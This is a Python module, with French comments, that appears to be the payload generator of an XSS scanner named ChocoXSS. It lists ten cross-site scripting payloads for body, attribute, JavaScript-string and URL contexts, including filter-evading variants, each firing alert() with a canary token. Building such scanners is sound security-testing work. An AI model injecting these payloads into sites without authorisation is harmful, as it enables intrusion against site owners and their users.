"""
ChocoXSS — Payload Engine (mode actif)
=========================================

Génère les payloads XSS à injecter dans chaque InjectionPoint découvert
par le crawler, catégorisés par contexte d'injection probable.

Principe du marqueur canari :
  Chaque payload embarque un token unique généré à l'exécution du scan
  (ex: "cxss7f3a2b"). Ça permet au reflection_checker de distinguer avec
  certitude "mon payload est revenu tel quel" d'un faux positif où du texte
  ressemblant à un payload XSS générique existait déjà sur la page pour
  d'autres raisons (contenu utilisateur préexistant, exemple de code affiché...).

Catégories de contexte :
  - HTML_BODY      : injection dans le corps HTML normal (entre balises)
  - HTML_ATTRIBUTE : injection dans la valeur d'un attribut HTML
  - JS_STRING      : injection dans une chaîne JS déjà présente dans un <script>
  - URL_CONTEXT    : injection dans un attribut href/src

En pratique on ne connaît pas le contexte exact avant d'avoir vu la réponse,
donc la V1 envoie systématiquement TOUTES les catégories pour chaque point
d'injection (stratégie "spray" classique des scanners XSS), et c'est le
reflection_checker qui détermine ensuite dans quel contexte le payload est
réellement retombé.
"""

from __future__ import annotations

import secrets
import string
from dataclasses import dataclass
from enum import Enum


class PayloadContext(Enum):
    HTML_BODY      = "html_body"
    HTML_ATTRIBUTE = "html_attribute"
    JS_STRING      = "js_string"
    URL_CONTEXT    = "url_context"


@dataclass
class Payload:
    context: PayloadContext
    template: str        # contient {marker} à remplacer
    description: str


# ─── Templates de payloads par contexte ──────────────────────────────────────
# {marker} est remplacé par le token unique généré pour ce scan.
# Chaque payload appelle alert('{marker}') plutôt que d'embarquer le marqueur
# comme un simple commentaire JS inerte : ça permet (a) la détection par
# texte brut (le marker reste une sous-chaîne visible dans le HTML renvoyé,
# utilisée par reflection_checker.py) ET (b) un effet observable réel si le
# payload s'exécute — le dialogue alert() est alors intercepté par
# headless_verifier.py pour confirmer l'exécution dans un vrai navigateur.

PAYLOAD_TEMPLATES: list[Payload] = [
    # ── HTML_BODY : injection directe entre balises ────────────────────────────
    Payload(
        PayloadContext.HTML_BODY,
        "<script>alert('{marker}')</script>",
        "Injection de balise <script> — confirme l'absence d'encodage HTML",
    ),
    Payload(
        PayloadContext.HTML_BODY,
        '<img src=x onerror="alert(\'{marker}\')">',
        "Balise img avec handler onerror — s'exécute même si <script> est filtré",
    ),
    Payload(
        PayloadContext.HTML_BODY,
        '<svg onload="alert(\'{marker}\')">',
        "SVG onload — contourne certains filtres qui ne bloquent que <script>/<img>",
    ),

    # ── HTML_ATTRIBUTE : sortie d'un attribut avec un guillemet ────────────────
    Payload(
        PayloadContext.HTML_ATTRIBUTE,
        '" onmouseover="alert(\'{marker}\')" x="',
        "Sortie d'attribut par guillemet double, injection d'un nouvel attribut event",
    ),
    Payload(
        PayloadContext.HTML_ATTRIBUTE,
        "' onmouseover='alert(\"{marker}\")' x='",
        "Variante guillemet simple",
    ),
    Payload(
        PayloadContext.HTML_ATTRIBUTE,
        "\"><script>alert('{marker}')</script>",
        "Fermeture de balise depuis un contexte attribut",
    ),

    # ── JS_STRING : injection dans une chaîne JS déjà présente ─────────────────
    Payload(
        PayloadContext.JS_STRING,
        '";alert(\'{marker}\');"',
        "Échappement d'une chaîne JS entre guillemets doubles",
    ),
    Payload(
        PayloadContext.JS_STRING,
        "';alert(\"{marker}\");'",
        "Échappement d'une chaîne JS entre guillemets simples",
    ),
    Payload(
        PayloadContext.JS_STRING,
        "</script><script>alert('{marker}')</script>",
        "Fermeture prématurée du bloc <script> englobant",
    ),

    # ── URL_CONTEXT : injection dans href/src ──────────────────────────────────
    Payload(
        PayloadContext.URL_CONTEXT,
        "javascript:alert('{marker}')",
        "URI javascript: dans un attribut href/src",
    ),
]


def generate_marker() -> str:
    """Génère un token canari unique et peu susceptible d'apparaître naturellement."""
    alphabet = string.ascii_lowercase + string.digits
    return "cxss" + "".join(secrets.choice(alphabet) for _ in range(10))


def build_payloads(marker: str) -> list[tuple[str, PayloadContext, str]]:
    """
    Instancie tous les templates avec le marqueur donné.

    Returns:
        Liste de tuples (payload_final, contexte, description)
    """
    return [
        (tpl.template.format(marker=marker), tpl.context, tpl.description)
        for tpl in PAYLOAD_TEMPLATES
    ]
